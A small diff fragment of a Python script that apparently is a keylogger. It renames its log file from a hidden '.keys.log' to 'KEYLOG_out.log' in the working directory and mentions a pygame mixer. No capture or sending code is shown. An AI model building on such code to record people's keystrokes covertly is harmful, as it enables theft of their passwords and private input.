@@ -13,7 +13,7 @@ def main():
     running = True
 
     # Specify the name of the file (can be changed )
-    log_file = f'{os.getcwd()}/.keys.log'
+    log_file = f'{os.getcwd()}/KEYLOG_out.log'
     chars = "    "
     
     # initialize the pygame mixer
